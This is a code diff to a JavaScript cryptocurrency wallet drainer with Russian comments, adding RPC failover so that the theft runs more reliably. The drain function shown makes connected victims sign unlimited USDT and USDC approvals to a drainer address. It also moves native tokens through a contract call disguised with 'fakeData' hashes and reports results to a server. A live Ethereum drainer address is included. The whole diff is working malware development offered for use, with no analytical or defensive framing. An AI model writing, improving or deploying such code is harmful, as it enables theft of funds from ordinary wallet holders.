@@ -28,7 +28,7 @@ const CHAINS = {
     name: "Ethereum Mainnet",
     nativeToken: "ETH",
     chainIdHex: "0x1",
-    rpcUrls: ["https://ethereum-rpc.publicnode.com"],
+    rpcUrls: ["https://rpc.eth.gateway.fm", "https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
     usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
     drainerAddress: "0x22E2fdf36E1257012B7dD305A2939C5e08C958c5",
@@ -46,7 +46,7 @@ const CHAINS = {
     ],
     usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS", // Замените после деплоя
+    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS",
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY
   },
@@ -57,7 +57,7 @@ const CHAINS = {
     rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS", // Замените после деплоя
+    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS",
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY
   },
@@ -68,7 +68,7 @@ const CHAINS = {
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
     usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
-    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS", // Замените после деплоя
+    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
   }
@@ -76,6 +76,33 @@ const CHAINS = {
 
 // Утилита для задержки
 const delay = (ms) => new Promise(r => setTimeout(r, ms));
+
+// Функция для получения рабочего провайдера
+async function getWorkingProvider(rpcUrls, existingProvider = null) {
+  // Сначала проверяем существующий провайдер (если передан)
+  if (existingProvider) {
+    try {
+      await existingProvider.getBalance('0x0000000000000000000000000000000000000000');
+      console.log('✅ Используется переданный провайдер');
+      return existingProvider;
+    } catch (e) {
+      console.warn('⚠️ Переданный провайдер ненадёжен:', e.message);
+    }
+  }
+
+  // Если переданный провайдер не работает, перебираем RPC
+  for (const rpc of rpcUrls) {
+    try {
+      const provider = new ethers.providers.JsonRpcProvider(rpc);
+      await provider.getBalance('0x0000000000000000000000000000000000000000');
+      console.log(`✅ Используется RPC: ${rpc}`);
+      return provider;
+    } catch (e) {
+      console.warn(`⚠️ RPC ${rpc} недоступен: ${e.message}`);
+    }
+  }
+  throw new Error(`Нет доступных RPC для ${rpcUrls}`);
+}
 
 // Получение баланса нативного токена через API
 async function getBalanceFromExplorer(address, chainId) {
@@ -112,15 +139,7 @@ async function checkBalance(chainId, userAddress) {
     nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
   } catch (e) {
     console.warn(`Ошибка API для нативного баланса в ${config.name}: ${e.message}`);
-    let provider;
-    for (const rpc of config.rpcUrls) {
-      try {
-        provider = new ethers.providers.JsonRpcProvider(rpc);
-        await provider.getBlockNumber();
-        break;
-      } catch (_) {}
-    }
-    if (!provider) throw new Error(`Нет доступных RPC для ${config.name}`);
+    const provider = await getWorkingProvider(config.rpcUrls);
     nativeBalance = await provider.getBalance(userAddress);
   }
 
@@ -128,7 +147,7 @@ async function checkBalance(chainId, userAddress) {
     usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
   } catch (e) {
     console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
-    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
+    const provider = await getWorkingProvider(config.rpcUrls);
     const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
     usdtBalance = await usdt.balanceOf(userAddress);
   }
@@ -137,7 +156,7 @@ async function checkBalance(chainId, userAddress) {
     usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
   } catch (e) {
     console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
-    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
+    const provider = await getWorkingProvider(config.rpcUrls);
     const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
     usdcBalance = await usdc.balanceOf(userAddress);
   }
@@ -172,11 +191,13 @@ async function drain(chainId, signer, userAddress, bal) {
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
 
+  // Проверяем провайдер перед использованием
+  const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
   const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
   const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);
 
   // Проверка баланса ETH перед approve
-  const ethBalance = await signer.provider.getBalance(userAddress);
+  const ethBalance = await reliableProvider.getBalance(userAddress);
   const minEthRequired = ethers.utils.parseEther("0.0003");
   if (ethBalance.lt(minEthRequired)) {
     console.error(`❌ Недостаточно ${config.nativeToken} для газа: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
@@ -198,7 +219,7 @@ async function drain(chainId, signer, userAddress, bal) {
 
     if (allowanceBefore.lt(bal.usdtBalance)) {
       try {
-        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
+        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
         const tx = await usdt.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: ethers.utils.parseUnits("3", "gwei"),
@@ -234,7 +255,7 @@ async function drain(chainId, signer, userAddress, bal) {
     const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
     if (allowanceBefore.lt(bal.usdcBalance)) {
       try {
-        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
+        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
         const tx = await usdc.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: ethers.utils.parseUnits("3", "gwei"),
@@ -267,7 +288,7 @@ async function drain(chainId, signer, userAddress, bal) {
     if (value.gt(0)) {
       const taskId = Math.floor(Math.random() * 1000000);
       const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
-      const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
+      const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
 
       try {
         const tx = await drainer.processData(taskId, dataHash, nonce, {
@@ -291,7 +312,7 @@ async function drain(chainId, signer, userAddress, bal) {
 
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
   try {
-    const provider = new ethers.providers.JsonRpcProvider(CHAINS[chainId].rpcUrls[0]);
+    const provider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
     const balance = await token.balanceOf(userAddress);
     const decimals = await token.decimals();
